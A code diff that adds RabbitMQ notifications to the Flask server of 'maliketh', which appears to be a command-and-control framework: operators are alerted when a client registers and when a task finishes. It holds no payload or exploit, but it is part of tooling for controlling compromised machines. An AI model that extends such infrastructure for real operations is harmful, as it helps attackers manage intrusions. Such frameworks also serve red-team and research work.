@@ -2,7 +2,7 @@ from datetime import datetime
 from typing import Callable, Dict, Optional, Union, cast
 from flask import Blueprint, jsonify, make_response, redirect, request
 from maliketh.db import db
-import maliketh.crypto.aes
+from maliketh.operator.rmq import send_message_to_all_queues, send_message_to_operator
 from maliketh.models import *
 from functools import wraps
 from maliketh.config import (
@@ -118,6 +118,8 @@ def register():
     db.session.add(config)
     db.session.commit()
 
+    send_message_to_all_queues("Client connected")
+
     resp_body = json.dumps(
         {
             "status": True,
@@ -214,7 +216,8 @@ def post_task(decrypted_body: Optional[Dict[str, Union[str, bool]]] = None):
         task.executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         db.session.commit()
 
-        # TODO: add output to rabbitmq queue for the operator
+        op = Operator.filter(Operator.id == task.operator_id).first()
+        send_message_to_operator(op, "Task completed")
 
         return "OK"
     # If task is None, return empty task
